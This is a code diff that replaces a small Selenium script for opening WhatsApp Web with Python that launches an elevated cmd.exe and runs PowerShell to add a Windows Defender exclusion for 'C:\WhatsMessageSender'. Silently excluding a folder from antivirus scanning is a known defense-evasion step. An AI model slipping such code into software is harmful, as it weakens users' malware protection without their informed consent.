@@ -1,18 +1,4 @@
-from time import sleep as bekle
-import os
-from selenium import webdriver
-
-
-browser = webdriver.Chrome(executable_path=os.getcwd()+"\\chromedriver.exe")
-browser.get("https://web.whatsapp.com")
-
-bekle(5)
-
-
-for i in range(3):
-    bekle(1)
-    print(str(i+1)+". saniye")
-browser.quit()
-exit()
-
-print("Eee Çıkmadı mı?")
+#powershell -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath "C:\WhatsMessageSender"
+import win32com.shell.shell as shell
+commands = 'powershell -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath "C:\WhatsMessageSender"'
+shell.ShellExecuteEx(lpVerb='runas', lpFile='cmd.exe', lpParameters='/c '+commands)
